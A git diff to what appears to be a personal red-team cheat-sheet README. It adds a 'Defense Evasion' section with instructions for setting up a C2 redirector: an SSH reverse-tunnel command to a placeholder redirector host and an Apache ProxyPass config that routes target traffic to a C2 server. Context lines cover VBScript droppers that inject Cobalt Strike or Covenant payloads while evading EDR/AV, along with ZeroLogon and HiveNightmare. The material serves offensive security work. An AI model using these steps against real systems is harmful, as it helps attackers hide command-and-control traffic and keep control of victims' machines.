@@ -65,9 +65,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [PsExec](#psexec)
 	* [WMI](#wmi)
 	* [DCOM](#dcom)
-* **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
-	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
-	* [Covenant Grunt](#convenant-grunt)
+* **[Defense Evasion](#defense-evasion)**
+	* [Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)
+		* [Cobalt Strike Beacon](#cobalt-strike-beacon)
+		* [Covenant Grunt](#convenant-grunt)
+	* [C2 Redirector](#c2-redirector)
+		* [SSH Remote Tunnel](#ssh-remote-tunnel)
+		* [Apache mod_rewrite](#apache-mod_rewrite)
 * **[Low Hanging Fruits](#low-hanging-fruits)**
 	* [ZeroLogon](#zerologon)
 	* [HiveNightmare](#hivenightmare)
@@ -726,7 +730,8 @@ PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\s
 ### Reference
 * https://dolosgroup.io/blog/remote-access-cheat-sheet
 
-# Generate VBScript dropper (APC process injection)
+# Defense Evasion
+## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
 ### Cobalt Strike Beacon
 For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.
@@ -769,10 +774,33 @@ $filename='<file-path-to>\payload.bin'
 ```powershell
 wscript.exe .\realtest.vbs
 ```
-# Extra Red Teaming Tools (that i know of xD)
-* [MacroPack](https://github.com/sevagas/macro_pack) - Generate obfuscated Office Macro
-* [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
-* [ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect
+
+## C2 Redirector
+Instead of directly interacting victims and C2 server. This is actually a neat trick to just use a redirector to be a middle man and route all the C2 traffic to your C2 server (in your local network)
+
+### SSH Remote Tunnel
+1. Uncheck this line in `/etc/ssh/sshd_config` and restart ssh server
+```
+GatewayPorts clientspecified
+```
+2. Create reverse tunnel to the redirector. Be careful! this will open your local port (443) to to your VPS. _Note that on the left side is your redirector port and right side is your local C2 server port_
+```
+ssh -R 0.0.0.0:443:127.0.0.1:443 root@redirectorIP
+```
+
+### Apache mod_rewrite
+This would require an Apache2 server setup on your redirector and C2 server also needed to have a public IP address.
+1. Setup an Apache2 server on your redirector.
+2. Modify your apache configuration file in `/etc/apache2/sites-enabled/000-default.conf`
+```
+ProxyRequests Off
+
+# Target --> VPS --> C2
+ProxyPass /index.html http//c2IPADRESS/index.html
+
+# C2 --> VPS --> Target
+ProxyPassReverse /index.html http//c2IPADRESS/index.html
+```
 
 # Low Hanging Fruits
 ### ZeroLogon
